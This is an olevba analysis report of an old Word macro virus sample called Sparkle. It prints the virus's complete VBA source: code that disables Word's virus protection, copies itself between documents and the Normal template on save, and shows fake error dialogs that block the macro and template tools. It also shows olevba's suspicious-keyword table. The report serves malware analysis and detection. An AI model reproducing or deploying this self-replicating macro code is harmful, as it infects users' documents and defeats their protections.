olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sparkle.bas 
in file: Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0 - OLE stream: 'Macros/VBA/Sparkle'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileSave()
    On Error GoTo Error
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False

    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "Sparkle" Then
            DocumentInstalled = True
        End If
        Next
    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "Sparkle" Then
            GlobalInstalled = True
        End If
        Next
    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Sparkle", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="userform999", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="userform900", Object:=wdOrganizerObjectProjectItems
    With ActiveDocument
        .BuiltInDocumentProperties(wdPropertyTitle) = "SPARKLE97"
        .BuiltInDocumentProperties(wdPropertySubject) = "Word Macro Virri"
        .BuiltInDocumentProperties(wdPropertyAuthor) = "Talon 1997"
        .BuiltInDocumentProperties(wdPropertyManager) = "Talon 1997"
        .BuiltInDocumentProperties(wdPropertyCompany) = "Eifel Epidemic"
        .BuiltInDocumentProperties(wdPropertyComments) = "This Word Macro Virus Was Made By Talon"
         End With
        End If
    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Sparkle", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="userform999", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="userform900", Object:=wdOrganizerObjectProjectItems
        End If

Sparkle
Error:
End Sub
Sub Toolsmacro()
On Error GoTo Error
userform999.Show
Error:
End Sub
Sub Filetemplates()
On Error GoTo Error
userform900.Show
Error:
End Sub
Sub Sparkle()
On Error GoTo Error
If WeekDay(Now()) = 2 And Hour(Now()) = 9 Then
With ActiveDocument.Content
    .Font.Animation = wdAnimationSparkleText
Application.StatusBar = True
StatusBar = "Your Infected With The Word Macro Virus SPARKLE97, Talon"
Application.Caption = "Your Infected With The Word Macro Virus SPARKLE97, Talon"
End With
End If
ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate
Error:
End Sub
Sub ViewVbCode()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Tasks.ExitWindows
End Sub
-------------------------------------------------------------------------------
VBA MACRO userform999.frm 
in file: Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0 - OLE stream: 'Macros/VBA/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub ListBox2_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform999
End Sub
Private Sub UserForm_Initialize()
    ComboBox1.AddItem "Normal.dot(global template)"
End Sub
Private Sub CommandButton2_Click()
Unload userform999
End Sub
Private Sub CommandButton5_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform999
End Sub
Private Sub UserForm_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform999
End Sub
-------------------------------------------------------------------------------
VBA MACRO userform900.frm 
in file: Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0 - OLE stream: 'Macros/VBA/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub CommandButton1_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform900
End Sub
Private Sub CommandButton2_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform900
End Sub
Private Sub CommandButton3_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform900
End Sub
Private Sub CommandButton4_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform900
End Sub
Private Sub CommandButton5_Click()
Unload userform900
End Sub
Private Sub CommandButton6_Click()
Unload userform900
End Sub
Private Sub ListBox2_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform900
End Sub
Private Sub ScrollBar1_Change()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform900
End Sub
Private Sub UserForm_Click()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
Unload userform900
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Document templateD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Attach...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Automatically update document styles
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Global templates and add-ins�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Checked items are currently loaded.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Remove@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Full path:         C:\...MICROSOFT OFFICE\OFFICE\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Organizer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cancel@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macro Name:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macros in::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cancel@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Step Into
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Edit�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Create@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Delete@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Organizer...�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Description:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox2'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox3'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox4'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox2'" IN 'Virus.MSWord.Sparkle-31ab888f64d7435754b093b3cf972300a8a4d0d0' - OLE stream: 'Macros/userform999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |ListBox2_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |ScrollBar1_Change   |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

